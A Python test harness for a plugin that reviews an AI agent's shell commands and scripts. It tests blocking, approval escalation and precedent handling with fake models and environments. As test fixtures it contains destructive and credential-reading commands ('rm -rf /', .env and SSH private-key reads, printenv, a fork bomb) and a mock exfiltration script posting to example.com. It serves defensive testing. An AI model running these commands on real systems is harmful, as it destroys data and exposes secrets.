"""Local test harness for command-reviewer plugin logic (runs in sandbox only)."""
import sys, types, json, tempfile, pathlib, importlib.util, time

tmp = tempfile.mkdtemp()
fake = types.ModuleType("plugins"); fs = types.ModuleType("plugins.plugin_storage")
# mirror production layout: <home>/plugin-data/<name> (config.yaml lives at <home>)
fs.plugin_data_dir = lambda name: pathlib.Path(tmp) / "plugin-data" / name
sys.modules["plugins"] = fake; sys.modules["plugins.plugin_storage"] = fs

# fake in-process docker environment (the plugin reads scripts via
# tools.terminal_tool._active_environments)
class FakeEnv:
    env_type = "docker"
    home = "/container/home"
    def __init__(self): self.files = {}
    def execute(self, command, **kw):
        if command.strip() == "echo $HOME":
            return {"returncode": 0, "output": self.home}
        toks = command.split(None, 2)
        path = toks[2].strip("'\"") if len(toks) >= 3 else command
        if path in self.files:
            return {"returncode": 0, "output": self.files[path]}
        return {"returncode": 1, "output": f"cat: {path}: No such file or directory"}

FAKE_ENV = FakeEnv(); FAKE_ENV2 = FakeEnv()
fake_tt = types.ModuleType("tools.terminal_tool")
fake_tt._active_environments = {"default": FAKE_ENV}
fake_tools_pkg = types.ModuleType("tools"); fake_tools_pkg.terminal_tool = fake_tt
sys.modules["tools"] = fake_tools_pkg; sys.modules["tools.terminal_tool"] = fake_tt

# NOTE: no fake tools.approval — v0.2.9 verifies "Always" via config.yaml
# (the plugin's data dir is <tmp>/command-reviewer, so config = <tmp>/config.yaml)

def grant_always(tool_call_id):
    """Simulate the operator clicking Always: Hermes writes plugin_rule:<key>
    into config.yaml's command_allowlist."""
    rk = mod.register._pending_escalations[tool_call_id]["rule_key"]
    cfgp = pathlib.Path(tmp) / "config.yaml"
    existing = cfgp.read_text() if cfgp.exists() else "command_allowlist:\n"
    cfgp.write_text(existing + f"  - 'plugin_rule:{rk}'\n")

HERE = pathlib.Path(__file__).parent
spec = importlib.util.spec_from_file_location("command-reviewer", HERE / "__init__.py")
mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
mod._docker_discovery_override = lambda path, profile: (None, "disabled-in-tests")

def pipeify(text):
    return "\n".join(f"{n}|{line}" for n, line in enumerate(text.splitlines(), 1))

class FakeLLM:
    """behavior: single spec or list of specs consumed per call."""
    def __init__(self, behavior):
        self.specs = behavior if isinstance(behavior, list) else [behavior]
        self.calls = []
    def _next(self):
        return self.specs.pop(0) if len(self.specs) > 1 else self.specs[0]
    def complete_structured(self, **kw):
        self.calls.append(kw)
        b = self._next()
        if b == "safe":    return types.SimpleNamespace(parsed={"verdict":"SAFE","reason":"routine"}, model="mock-1", text="")
        if b == "mal":     return types.SimpleNamespace(parsed={"verdict":"MALICIOUS","reason":"exfil"}, model="mock-1", text="")
        if b == "sus":     return types.SimpleNamespace(parsed={"verdict":"SUSPICIOUS","reason":"powerful"}, model="mock-1", text="")
        if b == "garbage": return types.SimpleNamespace(parsed=None, model="mock-1", text="I think it's fine")
        if b == "empty":   return types.SimpleNamespace(parsed=None, model="mock-1", text="")
        if b == "raise":   raise TimeoutError("model timeout")
        raise AssertionError(b)

class FakeCtx:
    def __init__(self, mode="shadow", behavior="safe", files=None, dispatch_error=False):
        self.cfg = {"mode": mode}; self.behavior = behavior
        self.llm = FakeLLM(behavior); self.registered = {}
        self.files = files or {}
        self.dispatch_error = dispatch_error
    def get_config(self, k, default=None): return self.cfg.get(k, default)
    def register_auxiliary_task(self, *a, **k): self.aux = (a, k)
    def register_hook(self, name, fn): self.registered[name] = fn
    def dispatch_tool(self, name, args, **kwargs):
        self.dispatch_calls = getattr(self, "dispatch_calls", [])
        self.dispatch_calls.append((name, dict(args), dict(kwargs)))
        if self.dispatch_error:
            raise RuntimeError("dispatch unavailable")
        if name == "terminal":
            cmd = args.get("command", "")
            toks = cmd.split(None, 2)
            if len(toks) >= 3 and toks[0] == "cat" and toks[1] == "--":
                p = toks[2].strip("'\"")
                if p in self.files:
                    return self.files[p]
                return f"cat: {p}: No such file or directory"
            raise AssertionError(f"unexpected terminal dispatch: {cmd}")
        if name == "read_file":
            p = args.get("path")
            if p in self.files:
                return pipeify(self.files[p])
            return f"Error: file not found: {p}"
        raise AssertionError(f"unexpected dispatch: {name}")

def fresh(mode, behavior, files=None, **kw):
    ctx = FakeCtx(mode, behavior, **kw)
    FAKE_ENV.files = dict(files or {})
    fake_tt._active_environments = {"default": FAKE_ENV}
    mod.register(ctx)
    return ctx.registered["pre_tool_call"], ctx

def log_rows():
    p = pathlib.Path(tmp) / "plugin-data" / "command-reviewer" / "decisions.jsonl"
    return [json.loads(l) for l in p.read_text().splitlines()] if p.exists() else []

results = []
def check(name, got, want):
    results.append((name, got == want, got))

FILES = {
    "/scripts/benign.py": "import os\nprint('benign probe')",
    "/scripts/exfil.py": "import urllib.request\nurllib.request.urlopen('https://example.com', data=b'x')",
    "/scripts/run.sh": "echo hello",
}

# --- script ingestion: readable script -> contents reach the model ---
h, ctx = fresh("enforce", "safe", files=FILES)
r = h("terminal", {"command": "python3 /scripts/benign.py"}, "t1")
check("ingest: benign py -> pass", r, None)
check("ingest: no dispatch used for reads", len(getattr(ctx, "dispatch_calls", [])), 0)
check("ingest: model saw script contents", "print('benign probe')" in ctx.llm.calls[-1]["input"][0]["text"], True)
rows = log_rows()
check("ingest: log scripts read", rows[-1]["scripts"] == [{"path": "/scripts/benign.py", "status": "read:active-env", "chars": len(FILES["/scripts/benign.py"])}], True)

# malicious-looking script contents -> model verdict acts
h, ctx = fresh("enforce", "mal", files=FILES)
check("ingest: MALICIOUS content -> block", h("terminal", {"command": "python3 /scripts/exfil.py"}, "t1"),
      {"action":"block","message":"command-reviewer: model verdict MALICIOUS — exfil"})

# bash script also ingested
h, ctx = fresh("enforce", "safe", files=FILES)
check("ingest: bash script -> pass", h("terminal", {"command": "bash /scripts/run.sh"}, "t1"), None)
check("ingest: bash contents seen", "echo hello" in ctx.llm.calls[-1]["input"][0]["text"], True)

# direct ./script execution
h, ctx = fresh("enforce", "safe", files={"./run.sh": "echo hi"})
check("ingest: ./run.sh -> pass", h("terminal", {"command": "./run.sh"}, "t1"), None)
check("ingest: ./run.sh contents seen", "echo hi" in ctx.llm.calls[-1]["input"][0]["text"], True)

# unreadable script -> fail closed
h, _ = fresh("enforce", "safe")
check("ingest: unreadable -> hard block", h("terminal", {"command": "python3 /no/such/script.py"}, "t1"),
      {"action":"block","message":"command-reviewer: script '/no/such/script.py' could not be read for review — blocked. If the file should exist, retry the command; if this persists, run it manually or ask your operator."})
h, _ = fresh("shadow", "safe")
check("ingest: unreadable shadow -> no action", h("terminal", {"command": "python3 /no/such/script.py"}, "t1"), None)

# interpreter module invocation does NOT trigger ingestion
h, ctx = fresh("enforce", "safe")
check("no-ingest: python3 -m pip -> pass", h("terminal", {"command": "python3 -m pip list"}, "t1"), None)
check("no-ingest: no script section", "Script contents" not in ctx.llm.calls[-1]["input"][0]["text"], True)

# ambiguous environments (more than one active docker env) -> fail closed
h, _ = fresh("enforce", "safe", files=FILES)
fake_tt._active_environments = {"a": FAKE_ENV, "b": FAKE_ENV2}
check("ingest: ambiguous envs -> block", (h("terminal", {"command": "python3 /scripts/benign.py"}, "t1") or {}).get("action"), "block")
fake_tt._active_environments = {"default": FAKE_ENV}

# --- post_tool_call-based decision recording (gateway surfaces) ---
# v0.2.8 policy: only an "Always" answer (verified via the permanent
# allowlist) creates precedent. "once" records nothing; "session" is
# Hermes's in-session allowlist, also not DB-recorded.
h, ctx = fresh("enforce", "sus")
r1 = h("terminal", {"command": "systemctl restart recorder-unit"}, "t6", tool_call_id="call-1")
check("rec: escalate stashes", (r1 or {}).get("action"), "approve")
ctx.registered["post_tool_call"](tool_call_id="call-1", status="ok", result="done")
r2 = h("terminal", {"command": "systemctl restart recorder-unit"}, "t6", tool_call_id="call-2")
check("rec: once -> NO precedent, re-escalates", (r2 or {}).get("action"), "approve")

# "Always": Hermes writes the grant into config.yaml -> recorded
h, ctx = fresh("enforce", "sus")
r1 = h("terminal", {"command": "systemctl restart recorder-always-unit"}, "t6", tool_call_id="call-1b")
check("rec: always-escalate stashes with rule_key", (r1 or {}).get("rule_key", ""),
      mod._model_rule_key("systemctl restart recorder-always-unit", {}))
grant_always("call-1b")
ctx.registered["post_tool_call"](tool_call_id="call-1b", status="ok", result="done")
r2 = h("terminal", {"command": "systemctl restart recorder-always-unit"}, "t6", tool_call_id="call-2b")
check("rec: always -> precedent pass", r2, None)

h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "systemctl stop recorder-deny-unit"}, "t6", tool_call_id="call-3")
ctx.registered["post_tool_call"](tool_call_id="call-3", status="error",
    result="BLOCKED: Action denied by user. The user has NOT consented to this action.")
r = h("terminal", {"command": "systemctl stop recorder-deny-unit"}, "t6", tool_call_id="call-4")
check("rec: denied via post_tool_call -> block", (r or {}).get("action"), "block")

h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "systemctl reload recorder-timeout-unit"}, "t6", tool_call_id="call-5")
ctx.registered["post_tool_call"](tool_call_id="call-5", status="error",
    result="approval timed out without user response")
r = h("terminal", {"command": "systemctl reload recorder-timeout-unit"}, "t6", tool_call_id="call-6")
check("rec: timeout -> re-escalates", (r or {}).get("action"), "approve")

# approved-but-command-failed still counts as approved (consent was given) —
# v0.2.8: only when the operator chose "Always" (permanent allowlist)
h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "docker logs recorder-fail-unit"}, "t6", tool_call_id="call-7")
grant_always("call-7")
ctx.registered["post_tool_call"](tool_call_id="call-7", status="error", result="docker: Error: container gone")
r = h("terminal", {"command": "docker logs recorder-fail-unit"}, "t6", tool_call_id="call-8")
check("rec: always-but-failed -> precedent pass", r, None)

# core-guard BLOCKED result: the command never ran -> no-decision, no precedent
h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "systemctl stop recorder-blocked-unit"}, "t6", tool_call_id="call-9")
grant_always("call-9")  # even an Always-grain present: a BLOCKED result is not consent
ctx.registered["post_tool_call"](tool_call_id="call-9", status="error",
    result="BLOCKED: deleting in root path requires approval")
r = h("terminal", {"command": "systemctl stop recorder-blocked-unit"}, "t6", tool_call_id="call-10")
check("rec: BLOCKED result -> re-escalates, no precedent", (r or {}).get("action"), "approve")

# --- _model_rule_key: stable per command+content, different on change ---
k1 = mod._model_rule_key("python3 /scripts/a.py", {"/scripts/a.py": "h1"})
k2 = mod._model_rule_key("python3 /scripts/a.py", {"/scripts/a.py": "h1"})
k3 = mod._model_rule_key("python3 /scripts/a.py", {"/scripts/a.py": "h2"})
k4 = mod._model_rule_key("python3 /scripts/b.py", {"/scripts/a.py": "h1"})
check("rulekey: stable for same cmd+content", k1 == k2, True)
check("rulekey: changes on content change", k1 != k3, True)
check("rulekey: changes on command change", k1 != k4, True)

# --- paranoid rule_key carries a nonce: Always can never silence it ---
h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "crontab -e"}, "t6", tool_call_id="p1")
h("terminal", {"command": "crontab -e"}, "t6", tool_call_id="p2")
pend = mod.register._pending_escalations
check("paranoid: two stashes recorded", len([k for k in pend if pend[k]["command"] == "crontab -e"]), 2)
pk = [pend[k]["rule_key"] for k in pend if pend[k]["command"] == "crontab -e"]
check("paranoid: rule_keys differ (nonce)", pk[0] != pk[1], True)
check("paranoid: keys carry rule id", all("crontab-write" in k for k in pk), True)

# --- session-cwd-aware host reads (v0.2.8) ---
import os, shutil
host_tmp = tempfile.mkdtemp()
(proj := os.path.join(host_tmp, "proj")).startswith("/") and None
os.makedirs(os.path.join(host_tmp, "proj", "sub"), exist_ok=True)
open(os.path.join(host_tmp, "proj", "run.py"), "w").write("print('cwd probe')")
open(os.path.join(host_tmp, "proj", "sub", "run.py"), "w").write("print('subdir probe')")
open(os.path.join(host_tmp, "home-file.py"), "w").write("print('tilde probe')")
fake_tt.get_session_cwd = lambda k=None: host_tmp + "/proj"

# relative path resolved against session cwd (was: gateway cwd -> hard block)
h, ctx = fresh("enforce", "safe")
check("cwd: relative script readable", h("terminal", {"command": "python3 run.py"}, "t-cwd1"), None)
check("cwd: contents seen", "cwd probe" in ctx.llm.calls[-1]["input"][0]["text"], True)

# ~ expansion
old_home = os.environ.get("HOME"); os.environ["HOME"] = host_tmp
h, ctx = fresh("enforce", "safe")
check("cwd: tilde script readable", h("terminal", {"command": "python3 ~/home-file.py"}, "t-cwd2"), None)
check("cwd: tilde contents seen", "tilde probe" in ctx.llm.calls[-1]["input"][0]["text"], True)

# leading `cd` segment inside the same command adjusts the base
h, ctx = fresh("enforce", "safe")
check("cwd: cd-adjusted relative script readable", h("terminal", {"command": "cd sub && python3 run.py"}, "t-cwd3"), None)
check("cwd: subdir contents seen", "subdir probe" in ctx.llm.calls[-1]["input"][0]["text"], True)

# no session record -> falls back to the gateway cwd (old behavior preserved)
fake_tt.get_session_cwd = lambda k=None: None
check("cwd: no record -> gateway-cwd fallback (unit)", mod._resolve_host_path("run.py", task_id="t-x"),
      os.path.join(os.getcwd(), "run.py"))
fake_tt.get_session_cwd = lambda k=None: host_tmp + "/proj"
check("cwd: resolution unit (relative)", mod._resolve_host_path("run.py", task_id="t-y"),
      os.path.join(host_tmp, "proj", "run.py"))
check("cwd: resolution unit (tilde)", mod._resolve_host_path("~/home-file.py", task_id="t-y"),
      os.path.join(host_tmp, "home-file.py"))
os.environ["HOME"] = old_home or ""
shutil.rmtree(host_tmp, ignore_errors=True)

# --- candidate-path logic: cwd-joined candidate reaches the env tier -------
host_tmp2 = tempfile.mkdtemp()
os.makedirs(os.path.join(host_tmp2, "sproj"), exist_ok=True)
open(os.path.join(host_tmp2, "sproj", "joined.py"), "w").write("print('joined probe')")
fake_tt.get_session_cwd = lambda k=None: "/sessions/sproj"
h, ctx = fresh("enforce", "safe", files={"/sessions/sproj/joined.py": "print('joined probe')"})
r_j = h("terminal", {"command": "python3 joined.py"}, "t-cwd4")
check("cwd: joined candidate readable via env tier", r_j, None)
check("cwd: joined contents seen", ctx.llm.calls and "joined probe" in ctx.llm.calls[-1]["input"][0]["text"], True)
fake_tt.get_session_cwd = lambda k=None: host_tmp + "/proj"
shutil.rmtree(host_tmp2, ignore_errors=True)

# --- tilde paths resolve against the CONTAINER home via the env tier -------
h, ctx = fresh("enforce", "safe", files={"/container/home/probe28.py": "print('env-home probe')"})
check("tilde: env-home candidate readable", h("terminal", {"command": "python3 ~/probe28.py"}, "t-tilde"), None)
check("tilde: contents seen", "env-home probe" in ctx.llm.calls[-1]["input"][0]["text"], True)

# --- teknium review: fork-bomb regex must be bounded (no catastrophic
# backtracking) and fast even on adversarial 12KB single-line input ---
fb = next(rx for rid, rx, why in mod._PARANOID if rid == "fork-bomb")
check("forkbomb: classic matches", bool(fb.search(':(){ :|:& };:')), True)
check("forkbomb: spaced variant matches", bool(fb.search(': ( ) { : | : & } ;')), True)
check("forkbomb: benign braces do not match",
      bool(fb.search('func() { a | b & c }; echo done')), False)
adv = ":(){ " + "|&" * 6000 + "};"
t0 = time.monotonic()
fb.search(adv)
dt_ms = (time.monotonic() - t0) * 1000
check("forkbomb: 12KB adversarial line < 100ms", dt_ms < 100, True)
print(f"forkbomb timing: {dt_ms:.1f}ms on {len(adv)} chars")
# full hook call with a 12KB single-line command stays fast end-to-end
big_cmd = "echo start; " + adv + " echo end"
h, ctx = fresh("enforce", "safe")
t0 = time.monotonic()
r_big = h("terminal", {"command": big_cmd}, "t-fb")
dt_full = (time.monotonic() - t0) * 1000
check("forkbomb: full hook call < 500ms on 12KB", dt_full < 500, True)
print(f"forkbomb full-hook timing: {dt_full:.1f}ms")

# --- retry on empty verdict ---
h, ctx = fresh("enforce", ["empty", "safe"])
check("retry: empty then safe -> pass", h("execute_code", {"code": "x=1"}, "t2"), None)
check("retry: two model calls made", len(ctx.llm.calls), 2)

h, ctx = fresh("enforce", ["empty", "empty"])
r_retry = h("execute_code", {"code": "x=1"}, "t2")
check("retry: both empty -> escalate", (r_retry or {}).get("message"),
      "command-reviewer: could not parse reviewer verdict — needs your approval")
check("retry: escalate carries stable rule_key", (r_retry or {}).get("rule_key", "").startswith("command-reviewer:model:"), True)

h, ctx = fresh("shadow", ["garbage", "safe"])
check("retry: garbage then safe shadow -> no action", h("execute_code", {"code": "x=1"}, "t2"), None)

h, ctx = fresh("enforce", ["raise", "safe"])
check("retry: exception then safe -> pass", h("execute_code", {"code": "x=1"}, "t2"), None)

# --- regression: previous battery behaviors ---
h, _ = fresh("shadow", "safe")
check("regr: ls skip-list",        h("terminal", {"command": "ls -la"}, "t3"), None)
check("regr: git status skip-list", h("terminal", {"command": "git status"}, "t3"), None)
check("regr: cat .env -> no action", h("terminal", {"command": "cat /home/x/.env"}, "t3"), None)
check("regr: printenv -> no action", h("terminal", {"command": "printenv"}, "t3"), None)
check("regr: rm -rf / -> no action", h("terminal", {"command": "rm -rf /"}, "t3"), None)
check("regr: exec_code SAFE -> none", h("execute_code", {"code": "print('hi')"}, "t3"), None)
check("regr: non-reviewed tool",    h("read_file", {"path": "/x"}, "t3"), None)
h5, _ = fresh("enforce", "safe")
check("regr: cat .env -> block",    h5("terminal", {"command": "cat /home/x/.env"}, "t3"),
      {"action":"block","message":"command-reviewer: blocked by rule 'env-file-read' — reads a .env credential file"})
r_env = h5("terminal", {"command": "printenv"}, "t3")
check("regr: printenv -> escalate", (r_env or {}).get("action"), "approve")
check("regr: printenv message", (r_env or {}).get("message"),
      "command-reviewer: dumps the whole environment (secret reads) — needs your approval")
check("regr: printenv rule_key nonce", (r_env or {}).get("rule_key", "").startswith("command-reviewer:env-dump:"), True)
h9, _ = fresh("enforce", "sus")
r_sus = h9("terminal", {"command": "systemctl restart foo"}, "t3")
check("regr: SUSPICIOUS -> escalate", (r_sus or {}).get("message"),
      "command-reviewer: model verdict SUSPICIOUS — powerful")
check("regr: SUSPICIOUS rule_key", (r_sus or {}).get("rule_key", "").startswith("command-reviewer:model:"), True)

# --- precedent DB (v0.2) ---
h, ctx = fresh("enforce", "sus")
r1 = h("terminal", {"command": "systemctl restart proxy-broker"}, "t5")
check("prec: first run escalates", (r1 or {}).get("action"), "approve")
ctx.registered["post_approval_response"](command="systemctl restart proxy-broker",
                                         choice="always", description="ok")
r2 = h("terminal", {"command": "systemctl restart proxy-broker"}, "t5")
check("prec: exact approved -> pass", r2, None)
check("prec: no model call on exact hit", len(ctx.llm.calls), 1)

h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "systemctl stop critical-service"}, "t5")
ctx.registered["post_approval_response"](command="systemctl stop critical-service", choice="deny")
r = h("terminal", {"command": "systemctl stop critical-service"}, "t5")
check("prec: denied -> block", (r or {}).get("action"), "block")

h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "systemctl reload unique-unit-name"}, "t5")
ctx.registered["post_approval_response"](command="systemctl reload unique-unit-name", choice="timeout")
r = h("terminal", {"command": "systemctl reload unique-unit-name"}, "t5")
check("prec: timeout = no decision -> re-escalates", (r or {}).get("action"), "approve")

# normalization: whitespace differences still match
h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "docker   logs   widget-service"}, "t5")
ctx.registered["post_approval_response"](command="docker logs widget-service", choice="always")
r = h("terminal", {"command": "docker  logs   widget-service"}, "t5")
check("prec: normalized match -> pass", r, None)

# smart (machine) surface decisions are NOT precedent
h, ctx = fresh("enforce", "sus")
ctx.registered["post_approval_response"](command="systemctl restart smart-only-unit",
                                         choice="once", surface="smart")
r = h("terminal", {"command": "systemctl restart smart-only-unit"}, "t5")
check("prec: smart surface ignored -> escalates", (r or {}).get("action"), "approve")

# v0.2.7: text-only precedent for a script-free command beats paranoid
h, ctx = fresh("enforce", "safe")
h("terminal", {"command": "printenv"}, "t5")
ctx.registered["post_approval_response"](command="printenv", choice="always")
r = h("terminal", {"command": "printenv"}, "t5")
check("prec: text precedent beats paranoid (v0.2.7)", r, None)
check("prec: layer is precedent", log_rows()[-1]["layer"], "precedent")

# tier 2: similar precedent reaches the model as context
h, ctx = fresh("enforce", "sus", files={"/scripts/a.py": "print(1)"})
h("terminal", {"command": "python3 /scripts/a.py --mode list"}, "t5")
ctx.registered["post_approval_response"](command="python3 /scripts/a.py --mode list", choice="always")
h("terminal", {"command": "python3 /scripts/a.py --mode list2"}, "t5")
check("prec: similar fed as context", "Operator precedent" in ctx.llm.calls[-1]["input"][0]["text"], True)
check("prec: similar still judged", (log_rows()[-1]["action"]), "escalate")

# tier 2: malicious similar command blocked despite precedent context
h, ctx = fresh("enforce", "mal", files={"/scripts/a.py": "print(1)"})
r = h("terminal", {"command": "python3 /scripts/a.py --mode list2"}, "t5")
check("prec: malicious similar still blocked", (r or {}).get("action"), "block")

# execute_code precedent works too
h, ctx = fresh("enforce", "sus")
h("execute_code", {"code": "import shutil; shutil.rmtree('/tmp/bigcache')"}, "t5")
ctx.registered["post_approval_response"](command="import shutil; shutil.rmtree('/tmp/bigcache')", choice="always")
r = h("execute_code", {"code": "import shutil; shutil.rmtree('/tmp/bigcache')"}, "t5")
check("prec: execute_code exact approved -> pass", r, None)

# static rules now scan script CONTENTS (v0.2.6): hard floor inside files
h, _ = fresh("enforce", "safe", files={"/scripts/ssh_read.py": "print(open('/root/.ssh/id_ed25519').read())"})
check("static-content: ssh key read in script -> block", h("terminal", {"command": "python3 /scripts/ssh_read.py"}, "t9"),
      {"action":"block","message":"command-reviewer: blocked by rule 'private-key-read' — touches SSH private keys or .ssh (in script contents)"})
h, _ = fresh("enforce", "safe", files={"/scripts/cron.sh": "crontab -l >/dev/null 2>&1\necho ok"})
check("static-content: crontab in script -> escalate+hash", (h("terminal", {"command": "bash /scripts/cron.sh"}, "t9", tool_call_id="f-1") or {}).get("action"), "approve")
check("static-content: paranoid reason cites contents", "in script contents" in (log_rows()[-1]["reason"] or ""), True)
check("static-content: hash stashed", bool(mod._docker_discovery_override or _PENDING_HAS("f-1")), True)

# extractor guard: -c/-e code fragments are not script files (v0.2.7 fix)
check("extract: python -c code fragment not a script",
      mod._extract_script_paths("python3 -c \"import shutil; shutil.rmtree('/tmp/bigcache')\""), [])
check("extract: shutil call alone not a script",
      mod._extract_script_paths("import shutil; shutil.rmtree('/tmp/bigcache')"), [])
check("extract: direct exec still detected",
      mod._extract_script_paths("./scripts/run.sh"), ["./scripts/run.sh"])

# v0.2.7: hash-verified precedent short-circuits PARANOID rules
h, ctx = fresh("enforce", "safe", files={"/scripts/cron2.sh": "crontab -l >/dev/null\necho ok"})
r1 = h("terminal", {"command": "bash /scripts/cron2.sh"}, "t10", tool_call_id="g-1")
check("v027: paranoid script escalates first", (r1 or {}).get("action"), "approve")
grant_always("g-1")  # operator chose Always on the paranoid prompt
ctx.registered["post_tool_call"](tool_call_id="g-1", status="ok", result="done")
r2 = h("terminal", {"command": "bash /scripts/cron2.sh"}, "t10", tool_call_id="g-2")
check("v027: hash-approved precedent beats paranoid", r2, None)
FAKE_ENV.files["/scripts/cron2.sh"] = "crontab -l >/dev/null\necho changed"
r3 = h("terminal", {"command": "bash /scripts/cron2.sh"}, "t10", tool_call_id="g-3")
check("v027: changed bytes re-escalate paranoid", (r3 or {}).get("action"), "approve")

# v0.2.7: hash-bound DENIAL also short-circuits paranoid
h, ctx = fresh("enforce", "safe", files={"/scripts/cron3.sh": "crontab -e\necho x"})
h("terminal", {"command": "bash /scripts/cron3.sh"}, "t10", tool_call_id="h-1")
ctx.registered["post_tool_call"](tool_call_id="h-1", status="error",
    result="BLOCKED: Action denied by user. The user has NOT consented to this action.")
r = h("terminal", {"command": "bash /scripts/cron3.sh"}, "t10", tool_call_id="h-2")
check("v027: hash-denied precedent beats paranoid", (r or {}).get("action"), "block")

# v0.2.7: hard rules still outrank a hash-approved precedent
h, ctx = fresh("enforce", "safe", files={"/scripts/env2.sh": "cat /tmp/nonexistent.env"})
r1 = h("terminal", {"command": "bash /scripts/env2.sh"}, "t10", tool_call_id="i-1")
check("v027: hard-rule script escalates... blocked", (r1 or {}).get("action"), "block")

# content-hash binding (v0.2.4): approval bound to the script's bytes
h, ctx = fresh("enforce", "sus", files={"/scripts/c.py": "print(1)"})
r1 = h("terminal", {"command": "python3 /scripts/c.py"}, "t7", tool_call_id="c-1")
check("hash: escalate first", (r1 or {}).get("action"), "approve")
grant_always("c-1")
ctx.registered["post_tool_call"](tool_call_id="c-1", status="ok", result="done")
r2 = h("terminal", {"command": "python3 /scripts/c.py"}, "t7", tool_call_id="c-2")
check("hash: same content -> precedent pass", r2, None)
FAKE_ENV.files["/scripts/c.py"] = "import os; os.remove('/tmp/nowhere-probe')"
r3 = h("terminal", {"command": "python3 /scripts/c.py"}, "t7", tool_call_id="c-3")
check("hash: changed content -> voided, re-reviewed", (r3 or {}).get("action"), "approve")
check("hash: model called again on void", len(ctx.llm.calls), 2)
check("hash: void logged", any(r["layer"] == "precedent" and r["verdict"] == "VOID" for r in log_rows()[-3:]), True)

# denied precedent voids on content change too (fresh judgment, not auto-block)
h, ctx = fresh("enforce", "sus", files={"/scripts/d.py": "print(2)"})
h("terminal", {"command": "python3 /scripts/d.py"}, "t7", tool_call_id="d-1")
ctx.registered["post_tool_call"](tool_call_id="d-1", status="error",
    result="BLOCKED: Action denied by user. The user has NOT consented to this action.")
FAKE_ENV.files["/scripts/d.py"] = "print('harmless now')"
r = h("terminal", {"command": "python3 /scripts/d.py"}, "t7", tool_call_id="d-2")
check("hash: denied+changed -> re-reviewed not auto-block", (r or {}).get("action"), "approve")

# non-script commands keep text-only precedent (no hash binding possible)
h, ctx = fresh("enforce", "sus")
h("terminal", {"command": "systemctl restart hash-test-unit"}, "t7", tool_call_id="e-1")
grant_always("e-1")
ctx.registered["post_tool_call"](tool_call_id="e-1", status="ok", result="done")
r = h("terminal", {"command": "systemctl restart hash-test-unit"}, "t7", tool_call_id="e-2")
check("hash: non-script precedent unchanged", r, None)

# docker-exec fallback (v0.2.5): works with NO active env registry
mod._docker_discovery_override = lambda path, profile: ("print(9)", "docker-exec")
fake_tt._active_environments = {}
h, ctx = fresh("enforce", "safe")
r = h("terminal", {"command": "python3 /tmp/probe_dockerexec.py"}, "t8")
check("dockerexec: no env registry -> read via docker exec", r, None)
check("dockerexec: contents reached model", "print(9)" in ctx.llm.calls[-1]["input"][0]["text"], True)
mod._docker_discovery_override = lambda path, profile: (None, "disabled-in-tests")
fake_tt._active_environments = {"default": FAKE_ENV}

rows = log_rows()
passed = sum(1 for _, ok, _ in results if ok)
print(f"case results: {passed}/{len(results)} passed")
for name, ok, got in results:
    if not ok: print("  FAIL:", name, "->", got)
print(f"log rows: {len(rows)}")
layers = {}
for r in rows: layers[r["layer"]] = layers.get(r["layer"], 0) + 1
print("layers:", layers)
assert passed == len(results), "some cases failed"
assert len(rows) >= 15, "expected a log row for every reviewed call"
ing = [r for r in rows if r["layer"] == "script-ingest"]
print("script-ingest rows:", len(ing))
print("sample:", json.dumps(rows[-1]))